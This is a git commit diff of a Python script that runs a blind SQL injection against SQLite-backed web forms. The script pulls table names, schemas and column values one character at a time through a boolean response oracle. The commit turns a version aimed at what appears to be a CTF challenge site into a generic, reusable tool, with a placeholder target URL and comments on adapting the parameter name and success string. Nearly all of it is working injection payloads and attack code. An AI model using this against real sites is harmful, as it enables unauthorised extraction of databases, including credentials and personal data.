af513d3493d165795475f5ed5e44b48d11dd7eeb
aykutcanustun <46404406+aykutcanustun@users.noreply.github.com>
2020-06-19 22:54:55 +0300

    main script

--- main.py
+++ main.py
@@ -1,19 +1,21 @@
 '''
-For table names:
+For retrieving table names:
 ' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {} --
 
-For table schema:
+For retrieving table schema:
 ' or UNICODE(SUBSTR((SELECT sql FROM sqlite_master WHERE tbl_name='$TABLE_NAME'),{},1)){} {} --
 
-For values inside columns:
+For retrieving values inside columns:
 ' or UNICODE(SUBSTR((SELECT $COLUMN_NAME FROM sqlite_master WHERE tbl_name='$TABLE_NAME'),{},1)){} {} --
+
+Replace $TABLE_NAME and $COLUMN_NAME with data that you retrieved from privious query.
 '''
 
 import requests
 
 s = requests.Session()
-query = "' or UNICODE(SUBSTR((SELECT kAdi FROM sqlite_master WHERE tbl_name='tr99'),{},1)){} {}--"
-url = "https://demirci.siberkuvvet.com/bsqli-34687af79e749b19c8485c1b8b218ea3/parola.php"
+query = "' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {}--" # Set query with above.
+url = "https://vulnable.webpage.com/forgotPassword.php" #Set URL
 charSeaching = 1
 interval = 0
 finished = False
@@ -21,15 +23,15 @@ finished = False
 while not finished:
     for i in 44, 56, 68, 80, 92, 104, 116, 128:
         req = s.post(
-            url, data={"kullanici": query.format(charSeaching, "<", str(i))})
-        if "Bilgiler gonderildi." in str(req.text):
+            url, data={"username": query.format(charSeaching, "<", str(i))}) # Replace "username" with the parameter in your request. 
+        if "Data Sent!" in str(req.text): # Replace "Data Sent!" with your requests reply.
             interval = i
             break
 
     for i in range(interval-12, interval):
         req = s.post(
-            url, data={"kullanici": query.format(charSeaching, "=", str(i))})
-        if "Bilgiler gonderildi." in str(req.text):
+            url, data={"username": query.format(charSeaching, "=", str(i))}) # Replace "username" with the parameter in your request. 
+        if "Data Sent!" in str(req.text): # Replace "Data Sent!" with your requests reply.
             charSeaching += 1
             finished = False
             print(chr(i), end="")
